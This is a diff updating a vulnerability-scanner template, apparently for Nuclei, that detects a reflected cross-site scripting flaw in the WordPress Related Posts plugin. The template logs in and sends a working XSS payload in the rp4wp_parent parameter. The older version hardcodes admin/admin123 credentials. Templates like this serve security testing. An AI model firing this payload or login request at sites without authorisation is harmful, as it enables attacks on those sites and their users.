@@ -1,14 +1,17 @@
 id: wp-related-post-xss
 
 info:
-  name: WordPress Related Posts <= 2.1.1 - Cross-Site Scripting
+  name: WordPress Related Posts <= 2.1.1 - Cross Site Scripting
   author: arafatansari
   severity: medium
   description: |
     WordPress Related Posts plugin before 2.1.1 contains an Reflected XSS via rp4wp_parent
   reference:
     - https://huntr.dev/bounties/7c9bd2d2-2a6f-420c-a45e-716600cf810e/
-  tags: wordpress,xss,plugin,wpscan
+    - https://wordpress.org/plugins/wordpress-23-related-posts-plugin/advanced/
+  metadata:
+    verified: true
+  tags: wordpress,wp,wp-plugin,xss,relatedposts,authenticated
 
 requests:
   - raw: 
@@ -17,26 +20,26 @@ requests:
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
        
-        log=admin&pwd=admin123&wp-submit=Log+In&redirect_to={{Host}}%2Fwp-admin%2F&testcookie=1
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
 
       - |
-        GET /wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1
+        GET /wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
         Host: {{Hostname}}
 
     cookie-reuse: true
-    redirects: true
-    max-redirects: 2
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - '<img src=x onerror=alert(1)>'
+          - '<img src=x onerror=alert(document.domain)>&action=edit'
+          - 'All Posts</a>'
+        condition: and
 
       - type: word
         part: header
         words:
-          - "text/html"
+          - text/html
 
       - type: status
         status:
